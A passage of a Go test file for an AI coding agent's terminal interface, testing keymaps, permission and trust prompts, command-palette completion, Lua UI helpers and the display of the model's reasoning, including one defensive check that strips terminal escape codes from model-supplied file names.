		{"ctrl+c drops a held prefix", false, false, "abc", []tea.KeyPressMsg{ctrlE, ctrlC}, false, false, "", ""},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, host := bootAgentApp(t, 90, 16)
			clock := time.UnixMilli(1000)
			agentID := store.ShortID()
			app.now = func() time.Time { return clock }
			runLua(t, app, `zemi.keymap.set("ctrl+e s", "zemi.ui.help")`)
			if c.active {
				host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: time.Second, Steering: []string{"also this"}})
			}
			if c.view {
				db, err := store.Open(filepath.Join(t.TempDir(), "p.db"))
				if err != nil {
					t.Fatal(err)
				}
				t.Cleanup(func() { db.Close() })
				host.DB, clock = db, clock.Add(time.Hour)
				if err := db.CreateSession(agentID, store.ShortID(), "run", "explore"); err != nil {
					t.Fatal(err)
				}
			}
			app.composer.text = c.draft
			for _, k := range c.keys {
				if k == view {
					if err := host.ViewAgent(agentID); err != nil {
						t.Fatal(err)
					}
					continue
				}
				if k == wait {
					clock = clock.Add(3 * time.Second)
					app.onFrame()
					continue
				}
				app.Update(k)
			}
			app.renderSync(t)
			frame := ansi.Strip(app.Frame())
			if app.cancelling != c.cancel || app.composer.text != c.composer || !strings.Contains(frame, c.row) || host.ViewedAgent() != "" || app.isArmed("ctrl+c") != c.armed || len(app.keySeq) > 0 {
				t.Fatalf("cancelling=%v composer=%q view=%q frame:\n%s", app.cancelling, app.composer.text, host.ViewedAgent(), frame)
			}
		})
	}
}

// TestPermissionPreview: a file tool's ask shows the proposed change, with
// escape sequences from model input stripped.
func TestPermissionPreview(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	done, done2 := make(chan struct{}), make(chan struct{})
	go func() {
		app.AskPermission(hostapi.PermRequest{
			Subject: "fs.write", Arg: "main.go\x1b[31m", Reason: "edit file",
			Preview: "--- a/main.go\n+++ b/main.go\n@@ -1 +1 @@\n-old line\n+new line\n",
		})
		close(done)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })
	app.renderSync(t)
	frame := app.Frame()
	if plain := ansi.Strip(frame); !strings.Contains(plain, "- old line") || !strings.Contains(plain, "+ new line") {
		t.Fatalf("preview missing:\n%s", plain)
	}
	if strings.Contains(frame, "\x1b[31m") {
		t.Fatal("model escape reached the permission chrome")
	}
	app.Update(tea.KeyPressMsg{Code: 'n', Text: "n"})
	<-done

	// a long target wraps at its slashes, keeping its start, its end and
	// the choices below it on screen
	long := "/opt/src/" + strings.Repeat("github.com/example/project/", 100) + "int_test.go"
	go func() {
		app.AskPermission(hostapi.PermRequest{Subject: "fs.read", Arg: long, Reason: "read"})
		close(done2)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })
	app.renderSync(t)
	if plain := ansi.Strip(app.Frame()); !strings.Contains(plain, "int_test.go") || !strings.Contains(plain, "/opt/src/") || !strings.Contains(plain, "esc") {
		t.Fatalf("target cut:\n%s", plain)
	}
	app.Update(tea.KeyPressMsg{Code: 'n', Text: "n"})
	<-done2
}

// TestLuaSelect drives zemi.ui.select from Lua: enter hands the chosen item
// to on_choice, esc hands it nil. The callback reports through a toast.
func TestLuaSelect(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	pick := `function(item) zemi.notify({ title = "picked", body = item or "none" }) end`

	runLua(t, app, `zemi.ui.select({ "red", "green" }, { prompt = "Color" }, `+pick+`)`)
	if len(app.overlays) != 1 || app.overlays[0].o.Title != "Color" {
		t.Fatalf("select overlay: %+v", app.overlays)
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if got := lastToast(app); got != "green" {
		t.Fatalf("enter picked %q", got)
	}

	runLua(t, app, `zemi.ui.select({ "x" }, {}, `+pick+`)`)
	app.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if got := lastToast(app); got != "none" {
		t.Fatalf("esc picked %q", got)
	}
}

// runLua runs src as user config and delivers the hooks it posted.
func runLua(t *testing.T, app *App, src string) {
	t.Helper()
	if err := app.host.RT.ExecuteChunk(context.Background(), src, "test.lua", lua.OriginUser); err != nil {
		t.Fatal(err)
	}
	for app.Pump() {
	}
}

// lastToast delivers queued hooks and returns the newest toast's body.
func lastToast(app *App) string {
	for app.Pump() {
	}
	if len(app.toasts) == 0 {
		return ""
	}
	return app.toasts[len(app.toasts)-1].body
}

// TestBandToTheEdge: a selected choice's band reaches the box's border
// whether or not its list scrolls.
func TestBandToTheEdge(t *testing.T) {
	choices := make([]promptChoice, 10)
	for i := range choices {
		choices[i] = promptChoice{label: fmt.Sprint("opt", i)}
	}
	for _, viewH := range []int{20, 4} {
		box := hostBox("", "", "", choiceView(choices, 1, &viewport{viewH: viewH}, 30, true), 40, 40, 30)
		band := 0
		for _, row := range box {
			for _, s := range row {
				if s.Fill == hostapi.FillBand {
					band += ansi.StringWidth(s.Text)
				}
			}
		}
		if want := hostapi.SegsWidth(box[0]) - 4; viewH < len(choices) {
			// the list scrolls: its bar cell is part of the band too
			if band != want+1 {
				t.Errorf("view of %d rows: the band takes %d cells, want %d", viewH, band, want+1)
			}
		} else if band != want {
			t.Errorf("view of %d rows: the band takes %d cells, want %d", viewH, band, want)
		}
	}
}

// TestMatchLook: a match is the accent on every row, bold on the selected
// one, and the selection is its own channel, the band (^), which a section
// header never takes.
func TestMatchLook(t *testing.T) {
	items := []listItem{
		{label: "sonnet", section: "anthropic", match: []int{3, 4, 5}},
		{label: "opus", section: "anthropic", desc: "net"},
		{label: "gpt", section: "openai", match: []int{0}},
	}
	for _, c := range []struct {
		name string
		sel  int
		want string
	}{
		{"the selected row is a band under its plain header, its match bold accent", 0, "[anthropic/Host:Title] [› /Host:Title^ son/Host:Bold^ net/Host:Title^] [opus/Host:Value net/Host:Hint] [openai/Host:Title] [g/Host:HintKey pt/Host:Value]"},
		{"a selected row with a desc match keeps the band", 1, "[anthropic/Host:Title] [son/Host:Value net/Host:HintKey] [› /Host:Title^ opus/Host:Bold^ net/Host:Hint^] [openai/Host:Title] [g/Host:HintKey pt/Host:Value]"},
	} {
		var got []string
		for _, row := range listRows(items, c.sel, nil, 20, 0) {
			var segs []string
			for _, s := range row {
				if strings.TrimSpace(s.Text) != "" {
					segs = append(segs, s.Text+"/"+s.HL+map[bool]string{true: "^"}[s.Fill == hostapi.FillBand])
				}
			}
			if segs != nil {
				got = append(got, fmt.Sprint(segs))
			}
		}
		if g := strings.Join(got, " "); g != c.want {
			t.Errorf("%s:\n got %s\nwant %s", c.name, g, c.want)
		}
	}
}

// TestPaletteArgumentCompletion: past "/name " the palette lists the
// command's argument candidates, tab fills the argument under the cursor,
// enter runs the command with the highlighted one once the user moved to it
// and a bare "/name " as typed.
func TestPaletteArgumentCompletion(t *testing.T) {
	app, host := bootAgentApp(t, 80, 20)
	ran := ""
	host.Commands.Add(&hostapi.Command{
		Name: "greet", NArgs: "?", GoFn: func(_ *hostapi.Host, args string) error { ran = args; return nil },
		GoComplete: func(*hostapi.Host, string, string) []string { return []string{"alice", "bob"} },
		Origin:     lua.OriginBuiltin, Gen: hostapi.Gen(1),
	})
	host.Commands.Add(&hostapi.Command{
		Name: "quiet", GoFn: func(*hostapi.Host, string) error { return nil },
		GoComplete: func(*hostapi.Host, string, string) []string { return []string{"loud"} },
		Origin:     lua.OriginBuiltin, Gen: hostapi.Gen(1),
	})
	many := []string{}
	for i := range 60 {
		many = append(many, fmt.Sprint("x", i))
	}
	host.Commands.Add(&hostapi.Command{
		Name: "many", NArgs: "*", GoFn: func(*hostapi.Host, string) error { return nil },
		GoComplete: func(*hostapi.Host, string, string) []string { return append(many, "zed") },
		Origin:     lua.OriginBuiltin, Gen: hostapi.Gen(1),
	})
	for _, c := range []struct{ keys, text, args string }{
		{"/greet b", "/greet b", "bob"},
		{"/greet b\t", "/greet bob ", ""}, // nargs "?" takes no second argument
		{"/gr\t", "/greet ", "alice bob"}, // an accepted name lists its arguments at once
		{"/quiet ", "/quiet ", ""},        // nargs "" takes no argument at all
		{"/many z", "/many z", "zed"},     // past the cap of 50
	} {
		app.clearComposer()
		for _, k := range c.keys {
			if k == '\t' {
				app.Update(tea.KeyPressMsg{Code: tea.KeyTab})
			} else {
				app.Update(tea.KeyPressMsg{Code: k, Text: string(k)})
			}
		}
		args := []string{}
		for _, a := range app.palette.args {
			args = append(args, a.label)
		}
		if app.composer.text != c.text || strings.Join(args, " ") != c.args || app.palette.open != (c.args != "") || len(app.palette.matches) != 0 {
			t.Errorf("%q: composer %q, args %v (open=%v, matches %d), want %q and %q", c.keys, app.composer.text, args, app.palette.open, len(app.palette.matches), c.text, c.args)
		}
	}
	for _, c := range []struct {
		keys []tea.KeyPressMsg
		want string
	}{
		{nil, ""},
		{[]tea.KeyPressMsg{{Code: tea.KeyDown}}, "bob"},
	} {
		app.clearComposer()
		ran = "-"
		for _, k := range "/greet " {
			app.Update(tea.KeyPressMsg{Code: k, Text: string(k)})
		}
		for _, k := range append(c.keys, tea.KeyPressMsg{Code: tea.KeyEnter}) {
			app.Update(k)
		}
		if ran != c.want {
			t.Fatalf("%v enter ran /greet %q, want %q", c.keys, ran, c.want)
		}
	}
}

// TestTrustAnswers: the cursor starts on Later, so enter, esc and ctrl+c
// trust nothing; trusting takes y, moving to its row or a click on it.
func TestTrustAnswers(t *testing.T) {
	click := func(label string) func(*App) {
		return func(app *App) {
			app.renderSync(t)
			x, y := findCell(t, app, label)
			clickAt(app, x+1, y)
		}
	}
	key := func(k tea.KeyPressMsg) func(*App) { return func(app *App) { app.Update(k) } }
	for _, c := range []struct {
		name, want string
		do         func(*App)
	}{
		{"y", "trust", key(tea.KeyPressMsg{Code: 'y', Text: "y"})},
		{"n", "untrust", key(tea.KeyPressMsg{Code: 'n', Text: "n"})},
		{"esc", "later", key(tea.KeyPressMsg{Code: tea.KeyEscape})},
		{"enter", "later", key(tea.KeyPressMsg{Code: tea.KeyEnter})},
		{"up enter", "untrust", func(app *App) { pressKeys(app, "k", "enter") }},
		{"ctrl+c", "later", key(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})},
		{"d", "", key(tea.KeyPressMsg{Code: 'd', Text: "d"})},
		{"click on Trust", "trust", click("Trust  ")},
		{"click on Don't trust", "untrust", click("Don't trust")},
		{"click on the path", "", click("/proj")},
	} {
		app, _ := bootAgentApp(t, 80, 24)
		done := make(chan string, 1)
		go func() { done <- app.AskTrust("/proj", "/proj", "") }()
		waitPrompt(t, app, func() bool { return app.trust != nil })
		c.do(app)
		if c.want == "" {
			if app.trust == nil || len(done) != 0 {
				t.Errorf("%s answered the prompt", c.name)
			}
			continue
		}
		if got := <-done; got != c.want {
			t.Errorf("%s answered %q, want %q", c.name, got, c.want)
		}
	}
}

// TestGoldenTrustPrompt pins the trust prompt at boot, started below the
// repository root, as /trust shows it with the current decision, and
// started outside the root with too little room, where the text scrolls.
func TestGoldenTrustPrompt(t *testing.T) {
	for _, c := range []struct {
		name, cwd, state string
		w, h             int
	}{
		{"boot", "/code/acme/services/api", "", 80, 24},
		{"command", "/code/acme", "trusted", 80, 24},
		{"worktree on a short screen", "/code/acme-wt", "", 60, 16},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentApp(t, c.w, c.h)
			go app.AskTrust("/code/acme", c.cwd, c.state)
			waitPrompt(t, app, func() bool { return app.trust != nil })
			app.renderSync(t)
			golden.RequireEqual(t, app.Frame())
			if app.Update(tea.KeyPressMsg{Code: tea.KeyPgDown}); app.trust.view.overflows() != (app.trust.view.top > 0) {
				t.Fatalf("pgdown moved the text to %d of %d rows", app.trust.view.top, app.trust.view.rows)
			}
			app.answerTrust("later")
		})
	}
}

// TestPromptKeyGrace: a key pressed within permGrace of a prompt opening
// is ignored, so typing cannot answer it; a later key answers.
func TestPromptKeyGrace(t *testing.T) {
	for _, c := range []struct {
		name, want string
		ask        func(app *App) string
		open       func(app *App) bool
	}{
		{"trust", "trust", func(app *App) string { return app.AskTrust("/proj", "/proj", "") }, func(app *App) bool { return app.trust != nil }},
		{"perm", "user:once", func(app *App) string {
			_, by := app.AskPermission(hostapi.PermRequest{Subject: "tool.shell", Arg: "make deploy"})
			return by
		}, func(app *App) bool { return app.permAsk != nil }},
	} {
		app, _ := bootAgentApp(t, 80, 20)
		done := make(chan string, 1)
		go func() { done <- c.ask(app) }()
		waitPrompt(t, app, func() bool { return c.open(app) })
		// the grace only applies with a program attached; set it after the
		// prompt opened so the ask still ran inline
		app.program = tea.NewProgram(nil)
		opened := app.now()
		app.now = func() time.Time { return opened.Add(permGrace / 4) }
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		if !c.open(app) || len(done) != 0 {
			t.Fatalf("%s: a key inside the grace answered the prompt", c.name)
		}
		app.now = func() time.Time { return opened.Add(permGrace + time.Millisecond) }
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		if got := <-done; got != c.want {
			t.Errorf("%s answered %q after the grace", c.name, got)
		}
	}
}

// TestPromptWaitsOnFullQueue: a blocking prompt posted while the hook queue
// is full waits for room; dropped, its caller would wait forever.
func TestPromptWaitsOnFullQueue(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	synctest.Test(t, func(t *testing.T) {
		// a queue made in the bubble, so Wait sees the ask blocked on it
		app.testQueue = make(chan tea.Msg, 1)
		app.do(func() {})
		done := make(chan string, 1)
		go func() { done <- app.AskTrust("/proj", "/proj", "") }()
		synctest.Wait()
		waitPrompt(t, app, func() bool { return app.trust != nil })
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		<-done
	})
}

// TestLuaUtil runs the shipped zemi.util helpers through the real runtime.
func TestLuaUtil(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	runLua(t, app, `
		local u = require("zemi.util")
		assert(u.trim("  hi \n") == "hi", "trim")
		assert(table.concat(u.split("a,,b", ","), "|") == "a||b", "split")
		assert(table.concat(u.keys({ b = 1, a = 2 }), ",") == "a,b", "keys")
		assert(u.get({ a = { b = { c = 3 } } }, "a", "b", "c") == 3 and u.get({}, "x", "y") == nil, "get")
		local cyc = { 1, name = "x" }
		cyc.self = cyc
		local s = u.inspect(cyc)
		assert(s == '{ 1, name = "x", self = <cycle> }', s)
		assert(not pcall(u.validate, "opt", 1, "string"), "validate")
	`)
}

// printedChat is the chat as zemi run --reasoning prints the session.
func printedChat(t *testing.T, host *hostapi.Host, width int) string {
	t.Helper()
	lines := printedLines(t, host, width)
	rows := make([]string, len(lines))
	for i, l := range lines {
		for _, seg := range l {
			rows[i] += seg.Text
		}
	}
	return strings.Join(rows, "\r\n")
}

func printedLines(t *testing.T, host *hostapi.Host, width int) [][]hostapi.Segment {
	t.Helper()
	live := host.AgentStream()
	st := hostapi.UIState{Printed: &hostapi.Printed{Rows: host.Session().Transcript, Live: &live, Reasoning: true}}
	lines, _, err := host.RenderWidget(t.Context(), host.Widgets.Get("chat"), width, 0, st)
	if err != nil {
		t.Fatal(err)
	}
	return lines
}

// TestReasoningExpanded: --reasoning shows a finished thought as one header
// with the text under a thin bar. A thought too short to count says no time,
// and thinking alone folds into its own digest.
func TestReasoningExpanded(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	host.AppendMessage("user", "why?")
	appendReasoning(host, "first idea\nsecond idea\n", hostapi.TurnStat{ThoughtMS: 4200})
	frame := printedChat(t, host, 78)
	if !strings.Contains(frame, "✻ thought 4.2s") {
		t.Fatalf("thought header missing:\n%s", frame)
	}
	if !strings.Contains(frame, "│   first idea") || !strings.Contains(frame, "│   second idea") {
		t.Fatalf("expanded reasoning layout:\n%s", frame)
	}
	// a thought too short to count says no time
	appendReasoning(host, "quick", hostapi.TurnStat{ThoughtMS: 20})
	app.renderSync(t)
	if frame := ansi.Strip(app.Frame()); strings.Contains(frame, "0.0s") || !strings.Contains(frame, "· thought 4.2s") {
		t.Fatalf("a zero thought time:\n%s", frame)
	}
}

// thoughtHead is the line carrying the live thinking mark, "" for a frame
// without one.
func thoughtHead(frame string) string {
	for l := range strings.SplitSeq(frame, "\n") {
		if strings.HasSuffix(strings.TrimRight(l, " \r"), " thinking") {
			return l
		}
	}
	return ""
}

// spinOf splits the mark's spinner glyph off a thought head, which stands at
// column 2 behind the bar.
func spinOf(head string) (mark, rest string) {
	if r := []rune(head); len(r) > 2 {
		return string(r[2]), string(r[:2]) + string(r[3:])
	}
	return "", head
}

// TestReasoningLiveTail: while the model thinks, only its last lines show, and
// the live mark animates (a braille spinner) without moving the header or tail.
func TestReasoningLiveTail(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Reasoning: "one\ntwo\nthree\nfour\nfive\n", Thinking: true})
	render := func(ms int64) string {
		app.now = func() time.Time { return time.UnixMilli(ms) }
		app.renderSync(t)
		return ansi.Strip(app.Frame())
	}
	// the default now is 500ms -> frame 10 -> braille index 1
	frame := render(500)
	if strings.Contains(frame, "✻ ") || !strings.Contains(frame, " thinking ") {
		t.Fatalf("live mark is not the braille spinner:\n%s", frame)
	}
	if strings.Contains(frame, "│   one") || !strings.Contains(frame, "│   two") || !strings.Contains(frame, "│   five") {
		t.Fatalf("live thinking tail:\n%s", frame)
	}
	// the spinner cycles a frameMS apart while the header and tail stay put
	a, b := render(500), render(750)
	headA, headB := thoughtHead(a), thoughtHead(b)
	spinA, restA := spinOf(headA)
	spinB, restB := spinOf(headB)
	if !strings.HasPrefix(headA, "│ ") || spinA == spinB {
		t.Fatalf("live mark does not animate on the rail:\n%s", a)
	}
	if restA != restB {
		t.Fatalf("header moved while animating:\n%s\n%s", a, b)
	}
	if strings.Replace(a, headA, "", 1) != strings.Replace(b, headB, "", 1) {
		t.Fatalf("tail moved while animating:\n%s\n%s", a, b)
	}
}

// TestReasoningSpinsBehindModal: the backdrop of an open box keeps its
// effects, so the live mark keeps stepping and the tick stays on the frame
// clock while the box waits for the reader.
func TestReasoningSpinsBehindModal(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Reasoning: "one\n", Thinking: true})
	app.openOverlay(hostapi.Overlay{ID: "usage", Title: "Usage", Body: "x"})
	render := func(ms int64) string {
		app.now = func() time.Time { return time.UnixMilli(ms) }
		app.renderSync(t)
		return ansi.Strip(app.Frame())
	}
	a, b := render(500), render(750)
	spinA, _ := spinOf(thoughtHead(a))
	spinB, _ := spinOf(thoughtHead(b))
	if spinA == "" || spinA == spinB {
		t.Fatalf("the live mark froze behind a box:\n%s", a)
	}
	if !app.spun || app.tickInterval() != frameInterval {
		t.Fatalf("a spinner behind a box ticks %v (spun %v)", app.tickInterval(), app.spun)
	}
}

// TestRailFoldsWhenTheTurnEnds: the live turn stands on the rail, a
// step's reads one row with the short thought before it as its suffix, a
// long thought a row of its own and a trailing one its own too; the
// ended turn folds into its digest alone, its rail a click away, and draws
// none of the thoughts the digest totals. A run the
// model closed with a reply folds the moment it starts answering, and the run
// it is working in stays open while it thinks and calls.
func TestRailFoldsWhenTheTurnEnds(t *testing.T) {
	app, host := bootAgentApp(t, 80, 24)
	host.AppendMessage("user", "look around")
	appendReasoning(host, "where to start", hostapi.TurnStat{ThoughtMS: 1200})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "a.go", Status: "ok"})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "b.go", Status: "ok"})
	appendReasoning(host, "a long one", hostapi.TurnStat{ThoughtMS: 8000})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "shell", Text: "ls", Label: "list the data", Status: "ok"})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "edit", Text: "a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -1 +1 @@\n-old\n+new"})
	appendReasoning(host, "that is all", hostapi.TurnStat{ThoughtMS: 400})
	rows := func() []string {
		app.renderSync(t)
		var out []string
		for row := range strings.SplitSeq(ansi.Strip(app.Frame()), "\r\n") {
			if row != "" && strings.TrimSpace(row) != "" {
				out = append(out, strings.Join(strings.Fields(row), " "))
			}
		}
		return out[:len(out)-3] // the composer
	}
	host.SeedStream(hostapi.StreamSnapshot{Active: true})
	app.AgentStream()
	live := []string{"▌ look around", "│", "│ ✻ thought 1.2s", "│", "│ read 2 files", "│", "│ ✻ thought 8.0s", "│", "│ list the data", "│ ✓ edit a.go +1 -1", "│", "│ ✻ thought 0.4s", "│"}
	if got := rows(); !slices.Equal(got, live) {
		t.Fatalf("live rail:\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(live, "\n"))
	}
	// the reply closes that run as it streams, before its row settles
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Text: "now the next one"})
	closed := []string{"▌ look around", "· 2 files, 1 command · thought 9.6s", "now the next one"}
	if got := rows(); !slices.Equal(got, closed) {
		t.Fatalf("the run the reply closed stays open:\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(closed, "\n"))
	}
	// its row settles, and the call after it opens a new run; the mid-turn
	// sentence carries no stat, so no diff of its own shows under it
	appendReply(host, "now the next one", hostapi.TurnStat{})
	host.SeedStream(hostapi.StreamSnapshot{Active: true})
	app.AgentStream()
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "c.go", Status: "ok"})
	closed = append(closed, "│ read c.go")
	if got := rows(); !slices.Equal(got, closed) {
		t.Fatalf("the run the reply closed stays open:\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(closed, "\n"))
	}
	host.SeedStream(hostapi.StreamSnapshot{})
	t.Logf("active=%v", host.AgentActive())
	if got, want := rows(), append(closed[:3:3], "· 1 file"); !slices.Equal(got, want) {
		t.Fatalf("ended turn:\n%s", strings.Join(got, "\n"))
	}
}

// TestReasoningPane: in pane mode a screen 100 columns or wider draws the
// thinking pane, whose header names the live thought and whose body follows
// its tail while the chat keeps only the thinking row; a click on a digest
// shows that run there, every row and thought open, and a second one goes
// back. A narrower screen has no pane: the tail stays inline and the click
// opens the run's rail under the digest.
func TestReasoningPane(t *testing.T) {
	var thought []string
	for i := range 40 {
		thought = append(thought, fmt.Sprintf("line%02d", i))
	}
	for _, c := range []struct {
		name          string
		width, height int
		pane          bool
	}{
		{"wide", 120, 30, true},
		{"narrow", 80, 24, false},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, host := bootAgentApp(t, c.width, c.height)
			if err := host.ToggleReasoning(); err != nil {
				t.Fatal(err)
			}
			// the shipped layout's config watch sets the pane's layout
			waitPrompt(t, app, func() bool { return !host.Layout().Root.Children[1].Children[1].Children[1].Children[1].Hidden })
			host.AppendMessage("user", "look around")
			appendReasoning(host, "where to start", hostapi.TurnStat{ThoughtMS: 1200})
			host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "a.go", Status: "ok"})
			host.AppendMessage("user", "and now?")
			host.SeedStream(hostapi.StreamSnapshot{Active: true, Reasoning: strings.Join(thought, "\n"), Thought: 4200 * time.Millisecond, Thinking: true})
			app.renderSync(t)
			frame := ansi.Strip(app.Frame())
			th, drawn := app.LayoutRects()["thinking"]
			// the chat's columns, left of the pane's separator
			chat := func(frame string) string {
				if !drawn {
					return frame
				}
				var b strings.Builder
				for row := range strings.SplitSeq(frame, "\r\n") {
					b.WriteString(ansi.Cut(row, 0, th.X-1) + "\n")
				}
				return b.String()
			}
			if drawn != c.pane || strings.Contains(frame, "thinking · 4.2s") != c.pane || strings.Contains(chat(frame), "│   line39") == c.pane ||
				!strings.Contains(frame, "line39") || strings.Contains(frame, "line00") || !strings.Contains(chat(frame), " thinking") {
				t.Fatalf("live, pane %v:\n%s", drawn, frame)
			}

			host.SeedStream(hostapi.StreamSnapshot{})
			t.Logf("active=%v", host.AgentActive())
			app.renderSync(t)
			x, y := findCell(t, app, "· 1 file · thought 1.2s")
			clickAt(app, x+2, y)
			for app.Pump() {
			}
			app.renderSync(t)
			frame = ansi.Strip(app.Frame())
			// the run opens in the chat either way; with the pane it reads there too
			if strings.Contains(frame, "turn · 1 file · thought 1.2s") != c.pane || strings.Contains(frame, "where to start") != c.pane ||
				!strings.Contains(chat(frame), "│ read a.go") || !strings.Contains(chat(frame), "· 1 file · thought 1.2s") {
				t.Fatalf("a digest clicked:\n%s", frame)
			}
			if c.pane {
				// the inspector reads from the top under its header, whose state
				// word is a Title over a blank row that stays when the body
				// scrolls, then the run's rows without their rail: the pane's
				// separator is the only vertical line
				var pane []string
				for row := range strings.SplitSeq(frame, "\r\n") {
					pane = append(pane, strings.TrimRight(ansi.Cut(row, th.X, th.X+th.Width), " "))
				}
				if want := []string{"  turn · 1 file · thought 1.2s", "", "", "  ✻ thought 1.2s", "  where to start"}; !slices.Equal(pane[th.Y-2:th.Y+3], want) {
					t.Fatalf("the inspector:\n%s", strings.Join(pane, "\n"))
				}
				if i := slices.IndexFunc(app.lastRows[th.Y-2], func(s hostapi.Segment) bool { return s.Text == "turn" }); i < 0 || app.lastRows[th.Y-2][i].HL != "Title" {
					t.Fatalf("the header's state word is not a Title: %+v", app.lastRows[th.Y-2])
				}
				// the second click folds the run and returns the pane to live (the
				// opened rows moved the bottom-anchored digest up, so find it again)
				x, y = findCell(t, app, "· 1 file · thought 1.2s")
				clickAt(app, x+2, y)
				for app.Pump() {
				}
				app.renderSync(t)
				if frame = ansi.Strip(app.Frame()); strings.Contains(frame, "turn · ") || strings.Contains(chat(frame), "│ read a.go") {
					t.Fatalf("the digest clicked again stays open:\n%s", frame)
				}
			}
		})
	}
	// thought text lives in the pane: turning it on closes a thought unrolled
	// in the chat, its opened run staying open, and turning it off reopens none
	t.Run("toggle", func(t *testing.T) {
		app, host := bootAgentApp(t, 120, 30)
		host.AppendMessage("user", "look around")
		appendReasoning(host, "deep thought text", hostapi.TurnStat{ThoughtMS: 8000})
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "a.go", Status: "ok"})
		appendReply(host, "done", hostapi.TurnStat{})
		chat := func() string {
			app.renderSync(t)
			frame := ansi.Strip(app.Frame())
			th, drawn := app.LayoutRects()["thinking"]
			var b strings.Builder
			for row := range strings.SplitSeq(frame, "\r\n") {
				if drawn {
					row = ansi.Cut(row, 0, th.X-1)
				}
				b.WriteString(row + "\n")
			}
			return b.String()
		}
		for _, text := range []string{"· 1 file · thought 8.0s", "✻ thought 8.0s"} {
			chat()
			x, y := findCell(t, app, text)
			clickAt(app, x+2, y)
			for app.Pump() {
			}
		}
		if got := chat(); !strings.Contains(got, "deep thought text") {
			t.Fatalf("the thought did not unroll:\n%s", got)
		}
		for _, on := range []bool{true, false} {
			if err := host.ToggleReasoning(); err != nil {
				t.Fatal(err)
			}
			waitPrompt(t, app, func() bool { return host.Layout().Root.Children[1].Children[1].Children[1].Children[1].Hidden != on })
			chat()
			if got := chat(); strings.Contains(got, "deep thought text") || !strings.Contains(got, "✻ thought 8.0s") {
				t.Fatalf("pane %v: the thought should stay closed in its open run:\n%s", on, got)
			}
		}
	})
}

// TestWorkingRowRetry: a waiting provider retry replaces the elapsed time
// with a countdown so the turn does not look stuck, and the rule names the
// running call nowhere: that is the chat row's job.
func TestWorkingRowRetry(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	for _, c := range []struct {
		in   time.Duration
		want string
	}{{0, ` esc interrupt · retrying now ─`}, {4 * time.Second, ` esc interrupt · next try in \ds ─`}} {
		host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Retrying: true, RetryIn: c.in, Retries: 1})
		app.renderSync(t)
		if frame := ansi.Strip(app.Frame()); !regexp.MustCompile(c.want).MatchString(frame) {
			t.Fatalf("retry row missing %q:\n%s", c.want, frame)
		}
	}
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: []hostapi.StreamTool{{Name: "shell", Status: "run", Label: "run the tests"}}})
	app.renderSync(t)
	if row := ansi.Strip(app.renderSegs(app.widgetLines("working")[0], 80)); strings.Contains(row, "run the tests") || strings.Contains(row, "shell") {
		t.Fatalf("the working row names the running call: %q", row)
	}
}

// TestWorkingRowMascot: the snail stays in the left corner on a plain rule
// and the turn shows in its eyes alone.
func TestWorkingRowMascot(t *testing.T) {
	for _, r := range "@·.─^><?" { // the rule's arithmetic counts one cell each
		if ansi.StringWidth(string(r)) != 1 {
			t.Fatalf("%q is not one cell wide", r)
		}
	}
	app, host := bootAgentApp(t, 80, 16)
	row := func(ms int64) string {
		app.now = func() time.Time { return time.UnixMilli(ms) }
		app.renderSync(t)
		segs := app.widgetLines("working")[0]
		if w := hostapi.SegsWidth(segs); w != 78 {
			t.Fatalf("the rule is %d cells, want 78", w)
		}
		return ansi.Strip(app.renderSegs(segs, 80))
	}
	// idle is the snail and a plain rule, whatever the frame
	want := "@··" + strings.Repeat("─", 75)
	if a, b := row(0), row(7000); a != want || b != want {
		t.Fatalf("idle rule moved: %q then %q", a, b)
	}
	// working drifts the two eye dots in place
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second})
	if a, b := row(0), row(300); !strings.HasPrefix(a, "@··─") || !strings.HasPrefix(b, "@.·─") {
		t.Fatalf("the working eyes do not drift: %q then %q", a, b)
	}
	// a long command keeps the working drift, there is no waiting state
	long := []hostapi.StreamTool{{Name: "shell", Status: "run", Started: time.Now().Add(-time.Minute)}}
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: long})
	if a, b := row(0), row(300); !strings.HasPrefix(a, "@··─") || !strings.HasPrefix(b, "@.·─") {
